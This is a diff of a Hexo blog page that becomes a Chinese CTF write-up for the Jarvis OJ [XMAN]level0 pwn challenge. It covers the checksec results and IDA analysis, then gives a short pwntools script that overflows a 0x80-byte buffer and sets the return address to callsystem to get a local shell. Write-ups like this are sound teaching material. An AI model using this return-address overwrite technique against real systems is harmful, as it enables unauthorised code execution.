@@ -6,14 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://iosmosis.github.io">
-  <title>Archives: 2018/3 | iosmosis&#39;s blog</title>
+  <title>Jarvis OJ Pwn writeup | iosmosis&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="iosmosis's blog">
-<meta property="og:url" content="http://iosmosis.github.io/archives/2018/03/index.html">
+  <meta name="description" content="此篇记录关于Jarvis OJ Pwn所有题目的writeup [XMAN]level0进行chack123456[*] &apos;/home/ios/Desktop/pwn0&apos;    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:">
+<meta name="keywords" content="Pwn,栈溢出,Jarvis OJ,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jarvis OJ Pwn writeup">
+<meta property="og:url" content="http://iosmosis.github.io/2018/03/21/Jarvis-OJ-Pwn-writeup/index.html">
 <meta property="og:site_name" content="iosmosis's blog">
+<meta property="og:description" content="此篇记录关于Jarvis OJ Pwn所有题目的writeup [XMAN]level0进行chack123456[*] &apos;/home/ios/Desktop/pwn0&apos;    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:">
+<meta property="og:image" content="http://iosmosis.github.io/2018/03/21/Jarvis-OJ-Pwn-writeup/1.jpg">
+<meta property="og:image" content="http://iosmosis.github.io/2018/03/21/Jarvis-OJ-Pwn-writeup/2.jpg">
+<meta property="og:updated_time" content="2018-03-21T07:47:48.084Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="iosmosis's blog">
+<meta name="twitter:title" content="Jarvis OJ Pwn writeup">
+<meta name="twitter:description" content="此篇记录关于Jarvis OJ Pwn所有题目的writeup [XMAN]level0进行chack123456[*] &apos;/home/ios/Desktop/pwn0&apos;    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:">
+<meta name="twitter:image" content="http://iosmosis.github.io/2018/03/21/Jarvis-OJ-Pwn-writeup/1.jpg">
   
     <link rel="alternative" href="/atom.xml" title="iosmosis&#39;s blog" type="application/atom+xml">
   
@@ -153,36 +161,71 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-Jarvis-OJ-Pwn-writeup" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/21/Jarvis-OJ-Pwn-writeup/" class="archive-article-date">
-  	<time datetime="2018-03-21T07:16:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-21</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/21/Jarvis-OJ-Pwn-writeup/">Jarvis OJ Pwn writeup</a>
+    <h1 class="article-title" itemprop="name">
+      Jarvis OJ Pwn writeup
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2018/03/21/Jarvis-OJ-Pwn-writeup/" class="archive-article-date">
+  	<time datetime="2018-03-21T07:16:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-21</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>此篇记录关于Jarvis OJ Pwn所有题目的writeup</p>
+<h2 id="XMAN-level0"><a href="#XMAN-level0" class="headerlink" title="[XMAN]level0"></a>[XMAN]level0</h2><h4 id="进行chack"><a href="#进行chack" class="headerlink" title="进行chack"></a>进行chack</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[*] <span class="string">'/home/ios/Desktop/pwn0'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div></pre></td></tr></table></figure>
+<ul>
+<li><a id="more"></a>
+<the rest="" of="" contents="" |="" 余下全文=""><br>NX开启 栈溢出保护关闭 <h4 id="附件拖入ida"><a href="#附件拖入ida" class="headerlink" title="附件拖入ida"></a>附件拖入ida</h4></the></li>
+</ul>
+<p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/1.jpg" alt="ida"></p>
+<p>main函数里跳转到了vulnerable_function()</p>
+<h4 id="跟进"><a href="#跟进" class="headerlink" title="跟进"></a>跟进</h4><p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/2.jpg" alt="ida1"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">可以看到<span class="built_in">read</span>可读的大小为0x200 512字节</div><div class="line">buf大小为0x80字节</div></pre></td></tr></table></figure>
+<h4 id="查看函数窗口-找到callsystem-查看代码发现已经写好了shell"><a href="#查看函数窗口-找到callsystem-查看代码发现已经写好了shell" class="headerlink" title="查看函数窗口 找到callsystem() 查看代码发现已经写好了shell"></a>查看函数窗口 找到callsystem() 查看代码发现已经写好了shell</h4><p>屡一下流程 main函数跳转到了vulnerable_function()然后 read一个大小不超过512的字节 然后返回函数</p>
+<p>思路很清晰了 我们需要将vulnerable_function()函数的返回地址覆盖为callsystem()函数的地址即可成功getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">buf <span class="number">0x80</span></div><div class="line">ebp <span class="number">0x8</span></div><div class="line">淹没bp <span class="number">0x80</span>+<span class="number">0x8</span></div><div class="line">callsystem_addr = <span class="number">0x400596</span></div></pre></td></tr></table></figure>
+<h3 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'./pwn0'</span>)</div><div class="line"></div><div class="line">callsystem_addr = <span class="number">0x400596</span></div><div class="line"></div><div class="line">payload = <span class="string">'A'</span>*<span class="number">0x88</span> +p64(callsystem_addr)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~/Desktop$ python pwn0.py</div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./pwn0'</span>: pid 3517</div><div class="line">[*] Switching to interactive mode</div><div class="line">Hello, World</div><div class="line">$ ls</div><div class="line">core               peda-session-pwn50.txt  pwn0.py    pwn50.py</div><div class="line">peda-session-pwn0.txt  pwn0               pwn50</div><div class="line">$</div></pre></td></tr></table></figure>
+<p>成功getshell</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>感谢支持哦~<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -206,107 +249,92 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACNElEQVR42u3ay24iMRAFUP7/pxkpq0gZmnvLoAT7eMUimD4dqVSv2y0+96/Tfv5+Ht356Fu3dxwMDIyPZdwvz89HzB/o+v78lUU3YGBgHMDIr0tCahJGk4CbPBsGBgZGnvblYXeWemJgYGC0AffRd/MQfH0DBgYGxqyIzcNu8sOztt0LanEMDIwPZLxvMLD++U/MNzAwMH6VcS9Pmya2iebwqTAwMLZmJElbXl4m7bZZyhiFYwwMjK0Z+UBxfbTZturq4I6BgbE1I0/m8sRxZbSQR1QMDIy9GetLXdfIdsw5XNrAwMA4jJH/fBs6Z5ikGYeBgbE3Y7bOtZIgtusddSmLgYGxHaNtZs0WudqCOX+5GBgYJzDyRYd8L+tVK1+z0hoDA2M/xqyAbGcO7bpYHuIxMDDOYawMI/OmWz1BzZt0GBgYxzDyZYvZT76xAYeBgXEAo0jCXpTMtcsWTwI3BgbG1oxZ6/+al4fm9cd90jXEwMDYjpGHv3wNYhZSE1L0f8DAwNiCkReNs6SwLYPzcUIxd8XAwNiCkYe2thCdlcp5Mw4DA+MExqxwLYaLQdp3Kw8GBsZpjHt51vOx9Xbbf+7EwMDYmjFbz0oK1DZ9bIegGBgYpzFmK1l5i3/W1KvfPQYGxgGMNsjO/mblPLkZAwMDoyxBZ2POtnv2skwTAwNjO0Y7zkxK0OS70XgAAwNja0ZSas7GA8U0dQbAwMA4gLFSQOaFa7solrTeluYbGBgYn8H4B4Rm2xnYafYsAAAAAElFTkSuQmCC" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/21/When-Did-You-Born/" class="archive-article-date">
-  	<time datetime="2018-03-21T02:49:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-21</time>
-</a>
-        </div>
-    	 
+<nav id="article-nav">
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/21/When-Did-You-Born/">When Did You Born</a>
-    </h1>
+    <a href="/2018/03/21/When-Did-You-Born/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          When Did You Born
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+
+
+
+
+
+  
+    <div class="duoshuo"></div>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Pwn</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">南邮CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">栈溢出</a>
-        		</li>
-      		
-		</ul>
-	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/20/hexofix/" class="archive-article-date">
-  	<time datetime="2018-03-20T15:37:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-20</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/20/hexofix/">关于hexo添加图片的问题</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Hexo</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">修复问题</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -329,8 +357,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
